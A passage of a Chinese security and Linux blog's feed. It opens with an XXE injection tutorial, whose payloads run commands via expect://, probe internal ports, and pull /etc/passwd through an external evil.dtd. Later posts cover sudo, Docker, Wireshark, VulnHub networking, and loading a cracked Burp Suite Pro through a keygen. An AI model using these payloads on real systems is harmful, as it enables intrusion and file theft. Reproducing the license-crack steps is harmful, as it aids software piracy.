+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "expect://id" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h5 id="3内网端口探测"><a class="markdownIt-Anchor" href="#3内网端口探测"></a> 3）内网端口探测</h5>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以对80端口进行探测，一般会探测比较常用的端口。</p>
+<h5 id="4攻击内网网站"><a class="markdownIt-Anchor" href="#4攻击内网网站"></a> 4）攻击内网网站</h5>
+<p>结合网站框架本身的漏洞，如struts2</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80/payload" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h5 id="5过滤了entity关键字"><a class="markdownIt-Anchor" href="#5过滤了entity关键字"></a> 5）过滤了ENTITY关键字</h5>
+<p>DTD文档支持这么一种定义，直接在定义文档类型的时候引入外部DTD文档，也就是在xml文档的第三部分使用ENTITY，所以在DTD文档类型定义中过滤了ENTITY的情况下，同样可以实现以上的四种方法。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE svg SYSTEM "http://118.89.16.36/evil.dtd"&gt;</span>   #????  test?  svg?</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">evil.dtd</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">test</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到在文档内容的部分使用了恶意的代码构造。</p>
+<h5 id="6行不通的方法"><a class="markdownIt-Anchor" href="#6行不通的方法"></a> 6）行不通的方法</h5>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY %param1 "file:///c:/1.txt"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY %param2 "http://127.0.0.1/?payload=%param1"&gt;</span></span><br><span class="line"><span class="meta">%param2;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样看起来可以读取系统文件内容来作为payload，是个可用的方法。<br>
+但是这样做行不通，原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</p>
+<h4 id="b-无回显的xxe漏洞blind-xxe"><a class="markdownIt-Anchor" href="#b-无回显的xxe漏洞blind-xxe"></a> B) 无回显的XXE漏洞—Blind XXE</h4>
+<h3 id="xxe防御"><a class="markdownIt-Anchor" href="#xxe防御"></a> xxe防御</h3>
+<ol>
+<li>使用开发语言提供的禁用外部实体的方法;</li>
+<li>过滤用户提交的XML数据;
+<ol>
+<li>检查所使用的底层xml解析库，默认禁止外部实体的解析</li>
+<li>使用第三方应用代码及时升级补丁</li>
+</ol>
+</li>
+</ol>
+<p>参考：</p>
+<p><a href="https://gist.github.com/staaldraad/01415b990939494879b4#file-xxe_payloads" target="_blank" rel="noopener">xxe payload</a></p>
+<p><a href="https://blog.csdn.net/zz_Caleb/article/details/90900214" target="_blank" rel="noopener">xxe 入门</a></p>
+<p><a href="https://www.exploit-db.com/docs/45374" target="_blank" rel="noopener">XXE Explanation and Exploitation</a>: VulnHub – XXE 1</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;xxe简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#xxe简介&quot;&gt;&lt;/a&gt; xxe简介&lt;/h3&gt;
+&lt;p&gt;XML External Entity Injection，xml外部实体注入漏洞&lt;/p&gt;
+&lt;p&gt;当允许引用外部实体时，通过构
+    
+    </summary>
+    
+      <category term="Network Security" scheme="http://flamepeak.com/categories/Network-Security/"/>
+    
+    
+      <category term="XXE" scheme="http://flamepeak.com/tags/XXE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux su sudo 区别</title>
+    <link href="http://flamepeak.com/2019/12/12/Linux-su-sudo-diffenence-20191212/"/>
+    <id>http://flamepeak.com/2019/12/12/Linux-su-sudo-diffenence-20191212/</id>
+    <published>2019-12-12T00:24:03.000Z</published>
+    <updated>2020-01-22T04:34:21.536Z</updated>
+    
+    <content type="html"><![CDATA[<p><code>su</code> 命令的主要作用是让你可以在已登录的会话中切换到另外一个用户。换句话说，这个工具可以让你在不登出当前用户的情况下登录为另外一个用户。</p>
+<p>通过<code>su</code>可以在用户之间切换，而超级权限用户root向普通或虚拟用户切换不需要密码，而普通用户切换到其它任何用户都需要密码验证。</p>
+<p>还有一种方法可以切换到 root 用户：运行 <code>su -</code> 命令</p>
+<p><code>su</code> 命令与 <code>su -</code> 命令之间有什么区别呢？前者在切换到 root 用户之后仍然保持旧的（或者说原始用户的）环境，而后者则是创建一个新的环境（由 root 用户 <code>~/.bashrc</code> 文件所设置的环境），相当于使用 root 用户正常登录（从登录屏幕登录）。</p>
+<h2 id="sudo与su"><a class="markdownIt-Anchor" href="#sudo与su"></a> sudo与su</h2>
+<p>两个命令的最大区别是：<code>sudo</code> 命令需要输入当前用户的密码，<code>su</code> 命令需要输入 root 用户的密码。</p>
+<h3 id="sudo"><a class="markdownIt-Anchor" href="#sudo"></a> sudo</h3>
+<p>sudo是一种权限管理机制，依赖于<code>/etc/sudoers</code>，其定义了授权给哪个用户可以以管理员的身份能够执行什么样的管理命令；</p>
+<p>格式：<code>sudo -u USERNAME COMMAND</code></p>
+<p>默认情况下，系统只有root用户可以执行sudo命令。需要root用户通过使用<code>visudo</code>命令编辑sudo的配置文件<code>/etc/sudoers</code>，才可以授权其他普通用户执行sudo命令。</p>
+<p>Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.<br>
+<code>sudo -l</code> The <code>-l</code> (list) option will list out the allowed (and forbidden) commands for the user on the current host.<br>
+通常来检查非root用户可以以高权限运行命令的程序。</p>
+<h3 id="su"><a class="markdownIt-Anchor" href="#su"></a> su</h3>
+<p>su为<code>switch user</code>，即切换用户的简写。</p>
+<p>su是最简单的身份切换名，用su我们能够进行不论什么用户的切换，一般都是<code>su - username</code>，然后输入password就ok了，可是root用su切换到其它身份的时候是不须要输入password的。</p>
+<p>格式为两种：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su -l USERNAME（-l为login，即登陆的简写）</span><br><span class="line">su USERNAME</span><br></pre></td></tr></table></figure>
+<p>如果不指定USERNAME（用户名），默认即为root，所以切换到root的身份的命令即为：<code>su -root</code>或<code>su -</code>，<code>su root</code> 或<code>su</code>。</p>
+<p><code>su USERNAME</code>，与<code>su - USERNAME</code>的不同之处如下：</p>
+<ul>
+<li><code>su - USERNAME</code>切换用户后，同时切换到新用户的工作环境中。</li>
+<li><code>su USERNAME</code>切换用户后，不改变原用户的工作目录，及其他环境变量目录。</li>
+</ul>
+<p><strong>如何设置初始su密码？</strong></p>
+<p>当我们输入su时会发现要输入密码，我们尝试输入自己当前用户的密码，发现failure。</p>
+<p>但我们又不知道su密码是什么？其实su初始密码可以通过下面方式进行设置：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`sudo` `passwd`</span><br></pre></td></tr></table></figure>
+<p>设置完后再输入su命令并键入刚才设置的密码即可进入~</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;code&gt;su&lt;/code&gt; 命令的主要作用是让你可以在已登录的会话中切换到另外一个用户。换句话说，这个工具可以让你在不登出当前用户的情况下登录为另外一个用户。&lt;/p&gt;
+&lt;p&gt;通过&lt;code&gt;su&lt;/code&gt;可以在用户之间切换，而超级权限用户root向普通或虚拟用户切换
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
+    
+    
+      <category term="Linux" scheme="http://flamepeak.com/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>BurpSuite 使用</title>
+    <link href="http://flamepeak.com/2019/12/10/Burpsuite%20tips%2020191210/"/>
+    <id>http://flamepeak.com/2019/12/10/Burpsuite tips 20191210/</id>
+    <published>2019-12-10T07:14:28.000Z</published>
+    <updated>2019-12-10T07:49:08.809Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="过滤不想拦截的网站"><a class="markdownIt-Anchor" href="#过滤不想拦截的网站"></a> 过滤不想拦截的网站</h3>
+<p><a href="https://security.stackexchange.com/questions/187069/burpsuite-just-passthrough-firefox-detect-portal" target="_blank" rel="noopener">Burpsuite: just passthrough firefox detect portal</a></p>
+<p>如果我们在Burpsuite遇到一个不想再拦截的请求，点击<code>Action</code>按钮，然后<code>Do not intercept...</code>，选择<code>requests to this host</code>即可。</p>
+<p>对于Firefox portal 请求，可以在浏览器地址栏输入<code>about:config</code>，然后搜索<code>network.captive-portal-service.enabled</code>，将<code>true</code>改为<code>false</code></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;过滤不想拦截的网站&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#过滤不想拦截的网站&quot;&gt;&lt;/a&gt; 过滤不想拦截的网站&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://security.stackexchange.com/questio
+    
+    </summary>
+    
+      <category term="Tools" scheme="http://flamepeak.com/categories/Tools/"/>
+    
+    
+      <category term="Burpsuite" scheme="http://flamepeak.com/tags/Burpsuite/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Windows docker 端口映射问题解决</title>
+    <link href="http://flamepeak.com/2019/12/09/docker-windows-port-mapping-problem-resolve-20191209/"/>
+    <id>http://flamepeak.com/2019/12/09/docker-windows-port-mapping-problem-resolve-20191209/</id>
+    <published>2019-12-09T08:26:13.000Z</published>
+    <updated>2019-12-09T08:47:53.603Z</updated>
+    
+    <content type="html"><![CDATA[<p>参考：<a href="https://www.iteye.com/blog/baobeituping-2432389" target="_blank" rel="noopener">解决无法对docker容器进行端口映射的问题 </a></p>
+<p>在安装了一个Windows下安装了docker，并尝试在其中运行Nginx、owncloud等服务，但映射完毕之后，在主机的浏览器中，打开localhost:port无法访问对应的服务。</p>
+<p>用百度尝试了下，始终找不到答案，难道这个问题大家都没遇到过么？于是使用Google，并用英文检索，一会就找到了对应的答案。</p>
+<blockquote>
+<p>The reason you’re having this, is because on <em>Linux</em>, the docker daemon (and your containers) run on the Linux machine itself, so “localhost” is also the host that the container is running on, and the ports are mapped to.</p>
+<p>On Windows (and OS X), the docker daemon, and your containers cannot run natively, so only the docker <em>client</em> is running on your Windows machine, but the <em>daemon</em> (and your containers) run in a VirtualBox Virtual Machine, that runs Linux.</p>
+</blockquote>
+<p>原来，docker是运行在Linux上的，在Windows中运行docker，实际上还是在Windows下先安装了一个Linux环境，然后在这个系统中运行的docker。也就是说，服务中使用的localhost指的是这个Linux环境的地址，而不是我们的宿主环境Windows。我们可以通过cmd命令</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">docker-machine ip default</span><br></pre></td></tr></table></figure>
+<p>找到这个Linux的ip地址，<strong>一般情况下这个地址是192.168.99.100</strong>，然后在Windows的浏览器中，输入这个地址，加上服务的端口即可启用了。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;参考：&lt;a href=&quot;https://www.iteye.com/blog/baobeituping-2432389&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;解决无法对docker容器进行端口映射的问题 &lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;在安装了一个Wind
+    
+    </summary>
+    
+      <category term="Tools" scheme="http://flamepeak.com/categories/Tools/"/>
+    
+    
+      <category term="Docker" scheme="http://flamepeak.com/tags/Docker/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>docker deploy hexo</title>
+    <link href="http://flamepeak.com/2019/12/09/docker-deploy-hexo-20191209/"/>
+    <id>http://flamepeak.com/2019/12/09/docker-deploy-hexo-20191209/</id>
+    <published>2019-12-09T03:07:13.000Z</published>
+    <updated>2019-12-09T09:02:50.278Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="install-docker"><a class="markdownIt-Anchor" href="#install-docker"></a> install docker</h2>
+<p><a href="http://flamepeak.com/2019/11/22/Docker-install-on-kali-20191122/">http://flamepeak.com/2019/11/22/Docker-install-on-kali-20191122/</a></p>
+<h2 id="install-git-nodejs"><a class="markdownIt-Anchor" href="#install-git-nodejs"></a> install git 、nodejs</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu</span><br><span class="line">docker run -itd --name hexo_byMe ubuntu /bin/bash</span><br><span class="line">docker <span class="built_in">exec</span> -it hexo_byMe /bin/bash</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get udpate</span><br><span class="line"><span class="comment"># 安装git</span></span><br><span class="line">apt-get install git-core</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装nodejs</span></span><br><span class="line"><span class="comment">#https://github.com/nodesource/distributions</span></span><br><span class="line"><span class="comment"># Using Ubuntu</span></span><br><span class="line">curl -sL https://deb.nodesource.com/setup_12.x | bash -</span><br><span class="line">sudo apt-get install -y nodejs</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查安装是否成功</span></span><br><span class="line">node -v</span><br><span class="line">npm</span><br></pre></td></tr></table></figure>
+<h2 id="安装hexo"><a class="markdownIt-Anchor" href="#安装hexo"></a> 安装Hexo</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line">npm install hexo --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-renderer-pandoc --save</span><br><span class="line">npm install hexo-renderer-marked --save</span><br><span class="line"></span><br><span class="line"><span class="comment">#如有必要安装pandoc</span></span><br><span class="line">curl -O -sL https://github.com/jgm/pandoc/releases/download/2.8.1/pandoc-2.8.1-1-amd64.deb </span><br><span class="line">dpkg -i pandoc-2.8.1-1-amd64.deb</span><br><span class="line"><span class="comment">#如果上面命令不行，可以尝试</span></span><br><span class="line">curl -sL -O http://th.archive.ubuntu.com/ubuntu/pool/universe/p/pandoc/pandoc_1.19.2.4~dfsg-1build4_amd64.deb</span><br><span class="line">dpkg -i pandoc_1.19.2.4~dfsg-1build4_amd64.deb</span><br><span class="line">apt --fix-broken install</span><br><span class="line">npm install hexo-renderer-pandoc --save</span><br></pre></td></tr></table></figure>
+<h2 id="测试hexo"><a class="markdownIt-Anchor" href="#测试hexo"></a> 测试Hexo</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g </span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+<p>如果在Windows系统，无法访问<code>localhost:4000</code>，请参考 <a href></a></p>
+<h2 id="备份images"><a class="markdownIt-Anchor" href="#备份images"></a> 备份Images</h2>
+<p>我们可以把container生成images来保存</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker commit -m=<span class="string">"has update"</span> -a=<span class="string">"author"</span> e218edb10161 blog_ver2</span><br><span class="line"></span><br><span class="line">各个参数说明：</span><br><span class="line">-m: 提交的描述信息</span><br><span class="line">-a: 指定镜像作者</span><br><span class="line">e218edb10161：容器 ID</span><br><span class="line">blog_ver2: 指定要创建的目标镜像名</span><br></pre></td></tr></table></figure>
+<h2 id="一些使用技巧"><a class="markdownIt-Anchor" href="#一些使用技巧"></a> 一些使用技巧</h2>
+<p>本地复制文件，可以通过这个命令来实现<code>docker cp</code></p>
+<h3 id="如何在容器与本地之间-copy-文件"><a class="markdownIt-Anchor" href="#如何在容器与本地之间-copy-文件"></a> 如何在容器与本地之间 copy 文件？</h3>
+<p>从容器到本地：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker cp &lt;containerId&gt;:/file/path/within/container /host/path/target</span><br></pre></td></tr></table></figure>
+<p>从本地到容器：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker cp filename &lt;containerId&gt;:/file/path/within/container</span><br></pre></td></tr></table></figure>
+<p>以上的操作如果是文件夹，就拷贝的是整个文件夹内容。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;install-docker&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#install-docker&quot;&gt;&lt;/a&gt; install docker&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;http://flamepeak.com/2019/1
+    
+    </summary>
+    
+      <category term="Web前端" scheme="http://flamepeak.com/categories/Web%E5%89%8D%E7%AB%AF/"/>
+    
+    
+      <category term="Hexo" scheme="http://flamepeak.com/tags/Hexo/"/>
+    
+      <category term="Docker" scheme="http://flamepeak.com/tags/Docker/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Wireshark 使用技巧</title>
+    <link href="http://flamepeak.com/2019/12/05/Wireshark-tips-20191205/"/>
+    <id>http://flamepeak.com/2019/12/05/Wireshark-tips-20191205/</id>
+    <published>2019-12-05T01:32:25.000Z</published>
+    <updated>2019-12-05T01:53:09.480Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="字符串搜索"><a class="markdownIt-Anchor" href="#字符串搜索"></a> 字符串搜索</h3>
+<ol>
+<li>
+<p>搜索字符串用<code>ctrl + F</code>，配置选项，选择<code>Packet Bytes</code>和<code>String</code>，然后输入想要查询的内容即可；</p>
+</li>
+<li>
+<p>可以在过滤框中直接输入<code>tcp and frame contains &quot;xxxxxxx&quot;</code>，来搜索内容</p>
+</li>
+<li>
+<p>可以使用<code>frame matches &quot;xxxxxx&quot;</code>，关键词matches使用与Perl语言兼容的正则表达式来搜索匹配。例如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frame matches &quot;(?i)bhi&quot;   #其中(?i)表示忽略大小写</span><br><span class="line">frame matches &quot;(?i)bh[is]&quot;    #匹配 BHS  BHI bHi bhi等</span><br><span class="line">frame matches &quot;(?i)(username|password)&quot;   #匹配username 或 password，忽略大小写</span><br><span class="line">frame matches &quot;\.(?i)(exe|zip|doc|xls|ppt|jar)&quot;  #\.表示转义，扩展名匹配</span><br><span class="line">frame matches &quot;\.com$&quot;   #匹配.com结尾   ^表示开头，$表示结尾</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>The ‘frame matches’ is a little different. This is a fairly flexible display filter and we will not cover all the options here. The keyword ‘matches’ is a “Regex next” to Wireshark - a Perl-compatible regular expression.</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;字符串搜索&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#字符串搜索&quot;&gt;&lt;/a&gt; 字符串搜索&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;搜索字符串用&lt;code&gt;ctrl + F&lt;/code&gt;，配置选项，选择&lt;code&gt;Packet Bytes
+    
+    </summary>
+    
+      <category term="Network Security" scheme="http://flamepeak.com/categories/Network-Security/"/>
+    
+    
+      <category term="Wireshark" scheme="http://flamepeak.com/tags/Wireshark/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>kali linux 2019.4 替换burpsuite pro</title>
+    <link href="http://flamepeak.com/2019/12/03/kali-replace-burpsuite-pro-20191203/"/>
+    <id>http://flamepeak.com/2019/12/03/kali-replace-burpsuite-pro-20191203/</id>
+    <published>2019-12-03T04:06:51.000Z</published>
+    <updated>2020-01-16T08:15:43.042Z</updated>
+    
+    <content type="html"><![CDATA[<p>参考：<a href="https://www.cnblogs.com/dbxiaobai/p/10646298.html" target="_blank" rel="noopener">kali linux 2019.1 替换burpsuite pro 1.7.37</a></p>
+<p>文章中的办法总体可行，但是，具体实现有问题</p>
+<ol>
+<li>
+<p>先切换JDK版本为1.8.执行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-alternatives  --config  java</span><br></pre></td></tr></table></figure>
+<p>然后会显示多个jdk版本，1.8选2</p>
+</li>
+<li>
+<p>输入<code>java –version</code>会显示jdk为1.8，把下载来的破解jar和原版burpsuite放到<code>/usr/bin</code>。</p>
+</li>
+<li>
+<p>执行破解burpsuite的流程，教程特别多。</p>
+</li>
+<li>
+<p>bash进入<code>/usr/bin</code>目录，先删除以前的免费版burpsuite，</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm –rf burpsuite</span><br></pre></td></tr></table></figure>
+<p>vi新建一个文件burpsuite，</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim burpsuite</span><br></pre></td></tr></table></figure>
+<p>内容为</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#java -jar burp-loader-keygen-2_1_07.jar</span></span><br><span class="line">java -noverify -Xbootclasspath/p:/usr/bin/burp-loader-keygen-2_1_07.jar -jar /usr/bin/burpsuite_pro_v2.1.07.jar</span><br></pre></td></tr></table></figure>
+<p>此处，调试很长时间都不行，个人认为和burp的破解版本有关系，也就是<code>burp_loader.jar</code>或者<code>burp_helper.jar</code>，在一些版本中上面方法可行，但是有些版本又不行。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">java -jar /usr/bin/burp-loader-keygen-2_1_05.jar</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>保存退出，增加执行权限<code>chmod +x burpsuite</code></p>
+</li>
+<li>
+<p>进入<code>/usr/share/applications</code>，并编辑burpsuite的快捷方式</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/applications</span><br><span class="line">vi kali-burpsuite.desktop</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p><code>Exec=sh -c &quot;java -jar /usr/bin/burpsuite&quot;</code>改为<code>Exec=sh -c &quot;/usr/bin/burpsuite&quot;</code></p>
+<p>此处，本人修改为<code>Exec=sh -c &quot;cd /usr/bin; /usr/bin/burpsuite&quot;</code></p>
+</li>
+<li>
+<p>然后就可以点桌面的快捷方式运行，开始快乐的使用吧！</p>
+</li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;参考：&lt;a href=&quot;https://www.cnblogs.com/dbxiaobai/p/10646298.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;kali linux 2019.1 替换burpsuite pro 1.7.37&lt;/a
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
+    
+    
+      <category term="kali" scheme="http://flamepeak.com/tags/kali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux VulnHub VMware network configuration</title>
+    <link href="http://flamepeak.com/2019/11/26/Linux-VulnHub-network-configuration-20191126/"/>
+    <id>http://flamepeak.com/2019/11/26/Linux-VulnHub-network-configuration-20191126/</id>
+    <published>2019-11-26T00:38:54.000Z</published>
+    <updated>2019-12-06T06:56:05.689Z</updated>
+    
+    <content type="html"><![CDATA[<p>本文参考了<a href="https://blog.csdn.net/nzjdsds/article/details/82811791" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/82811791</a>，但是此文没有解决写权限的问题</p>
+<p>在此详述以下个人问题解决过程</p>
+<p>owa文件一般直接用Vmware打开，按流程导入即可</p>
+<p>但是有时候会出现设置NAT网络，但是依然连不通的情况，这时候我们需要进入Linux恢复模式修改网卡设置</p>
+<p>我们点击开启虚拟机，到开机的页面我们回车选择第二个Ubuntu的高级选项（如果启动有网络正常的话可以直接正常开机，如果网络不正常可以按下面步骤操作） (如果出不来这个选择界面，开机时按下shirt键)</p>
+<p><img src="/sourcepictures/2019/11/26/1.png" alt="shift advanced options for ubuntu"></p>
+<p>进到高级选项，我们选择第二个Linux恢复模式(recovery mode)</p>
+<p><img src="/sourcepictures/2019/11/26/2.png" alt="recovery mode"></p>
+<p>回车后会弹出选择界面，我们选择root一行回车，然后再次回车进入命令行模式</p>
+<p><img src="/sourcepictures/2019/11/26/3.png" alt="root"></p>
+<p>一般来说，这种模式下都是只读模式，无法修改文件，可以执行以下命令，开启写权限</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fsck -f -y /</span><br><span class="line">mount --options remount,rw /</span><br></pre></td></tr></table></figure>
+<p>查看所有网卡：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig -a</span><br></pre></td></tr></table></figure>
+<p><img src="/sourcepictures/2019/11/26/4.png" alt="root"></p>
+<p>我的是ens33，然后继续输入命令 <code>vi /etc/network/interfaces</code> 修改网络配置文件</p>
+<p>对于一些Linux版本，网络配置文件位于<code>/etc/netplan</code> 文件夹下，可以使用<code>ls /etc/netplan</code>查看文件夹内yaml文件名，然后使用<code>vi</code>修改此配置文件</p>
+<p><img src="/sourcepictures/2019/11/26/5.png" alt="root"></p>
+<p>修改两个地方，改成你的网卡名称，然后ctrl+x保存，重启即可</p>
+<p>对于采用HostOnly模式的虚拟机，可以参考此文 <a href="https://blog.csdn.net/qq_28817739/article/details/77542860" target="_blank" rel="noopener">VMware-Host only（主机模式）网络连接方式</a>，在虚拟网卡vmware network adapter VMnet1中修改子网ip地址</p>
+<p>ubuntu12.04克隆后没有cannot find device eth0的问题</p>
+<p>于是查看一下所有的网络信息</p>
+<p><code>ifconfig -a</code><br>
+发现现实了eth2和eth3，并没有熟悉的eth0和eth1；<br>
+于是修改网络配置文件</p>
+<p><code>vi /etc/network/interfaces</code></p>
+<p>将<code>iface inet eth0 dhcp</code> 修改为<code>iface inet eth2 dhcp</code></p>
+<p>重启网卡</p>
+<p><code>/etc/init.d/networking restart</code></p>
+<p>而问题的原因在于：新克隆过来的机器网卡的mac地址是不同的，而以前的网卡信息依然保持在配置文件的那个中，如果找到这个文件将他删掉，让系统自动生成那么问题就能解决。</p>
+<p><code>vi /etc/udev/rules.d/70-persistent-net.rules</code></p>
+<p>可以看到咱们想要的东西 于是</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm /etc/udev/rules.d/70-persistent-net.rules</span><br><span class="line">/etc/init.d/networking restart</span><br></pre></td></tr></table></figure>
+<p>同样可以解决该问题。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;本文参考了&lt;a href=&quot;https://blog.csdn.net/nzjdsds/article/details/82811791&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net/nzjdsds/articl
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
+    
+    
+      <category term="Linux" scheme="http://flamepeak.com/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Kali 启用自动登录</title>
+    <link href="http://flamepeak.com/2019/11/22/Kali-enable-autologin-20191122/"/>
+    <id>http://flamepeak.com/2019/11/22/Kali-enable-autologin-20191122/</id>
+    <published>2019-11-22T01:37:24.000Z</published>
+    <updated>2019-12-02T03:40:44.416Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="kali20193"><a class="markdownIt-Anchor" href="#kali20193"></a> kali2019.3</h3>
+<p>Kali Linux use <code>GDM3</code> as a default Display Manager. First confirm that your Kali Linux is set to use <code>GDM3</code> as a default display manager:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># cat /etc/X11/default-display-manager</span><br><span class="line">/usr/sbin/gdm3</span><br></pre></td></tr></table></figure>
